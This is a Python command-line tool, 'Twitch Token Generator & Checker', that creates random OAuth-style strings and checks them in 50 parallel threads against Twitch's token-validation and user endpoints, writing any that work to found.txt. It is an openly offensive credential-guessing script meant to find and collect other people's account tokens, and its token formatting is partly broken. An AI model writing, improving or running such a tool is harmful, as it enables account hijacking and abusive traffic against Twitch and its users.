import random
import string
import requests
import time
import threading
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

def generate_twitch_token():
    """Generate a random Twitch-like token"""
    # Twitch OAuth tokens typically follow patterns like:
    # - oauth:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    # - Bearer xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    
    # Common token patterns observed
    patterns = [
        f"oauth:{''.join(random.choices(string.ascii_lowercase + string.digits, k=30))}",
        f"{''.join(random.choices(string.ascii_letters + string.digits, k=30))}",
        f"bearer_{''.join(random.choices(string.ascii_lowercase + string.digits, k=30))}",
    ]
    
    return random.choice(patterns)

def check_twitch_token(token):
    """Check if a Twitch token is valid"""
    headers = {
        'Authorization': f'Bearer {token}' if not token.startswith(('oauth:', 'bearer_')) else f'{token}',
        'Client-Id': 'kimne78kx3ncx6brgo4mv6wki5h1ko'  # Common Twitch client ID
    }
    
    try:
        # Try multiple endpoints to validate token
        endpoints = [
            'https://id.twitch.tv/oauth2/validate',
            'https://api.twitch.tv/helix/users'
        ]
        
        for endpoint in endpoints:
            response = requests.get(endpoint, headers=headers, timeout=10)
            if response.status_code == 200:
                return True, response.json()
    except:
        pass
    
    return False, None

def generate_and_check_tokens(amount):
    """Generate tokens and check them"""
    valid_count = 0
    generated_count = 0
    
    print(f"\n[+] Generating {amount} tokens...")
    
    def process_token(_):
        nonlocal valid_count, generated_count
        token = generate_twitch_token()
        is_valid, data = check_twitch_token(token)
        
        generated_count += 1
        
        if is_valid:
            valid_count += 1
            with open('found.txt', 'a', encoding='utf-8') as f:
                f.write(f"{token}\n")
            print(f"[✓] Valid token found ({valid_count}/{generated_count}): {token[:30]}...")
            return token, True
        else:
            print(f"[×] Invalid token ({generated_count}/{amount}): {token[:30]}...")
            return token, False
    
    # Use ThreadPoolExecutor for parallel processing
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(process_token, i) for i in range(amount)]
        
        for future in as_completed(futures):
            try:
                future.result(timeout=15)
            except:
                pass
    
    return valid_count

def main():
    """Main CLI interface"""
    os.system('title Twitch Token Generator & Checker' if os.name == 'nt' else '')
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = """
    ╔═══════════════════════════════════════╗
    ║      TWITCH TOKEN GENERATOR           ║
    ║         & CHECKER                     ║
    ╚═══════════════════════════════════════╝
    """
    
    print(banner)
    
    try:
        amount = int(input("[?] How many tokens to generate and check? "))
        
        if amount <= 0:
            print("[!] Please enter a positive number")
            return
        
        if amount > 10000:
            print("[!] Warning: Generating more than 10,000 tokens may take a while")
            confirm = input("[?] Continue? (y/n): ").lower()
            if confirm != 'y':
                return
        
        print(f"\n[+] Starting generation and validation of {amount} tokens...")
        print("[+] Press Ctrl+C to stop at any time\n")
        
        start_time = time.time()
        valid_count = generate_and_check_tokens(amount)
        end_time = time.time()
        
        print(f"\n{'='*50}")
        print(f"[✓] Generation complete!")
        print(f"[•] Total generated: {amount}")
        print(f"[•] Valid tokens: {valid_count}")
        print(f"[•] Success rate: {(valid_count/amount*100):.2f}%")
        print(f"[•] Time taken: {end_time-start_time:.2f} seconds")
        print(f"[•] Valid tokens saved to: found.txt")
        print(f"{'='*50}")
        
    except ValueError:
        print("[!] Please enter a valid number")
    except KeyboardInterrupt:
        print("\n\n[!] Process interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Clear previous found.txt if exists
    if os.path.exists('found.txt'):
        os.remove('found.txt')
    
    main()
    
    input("\nPress Enter to exit...")
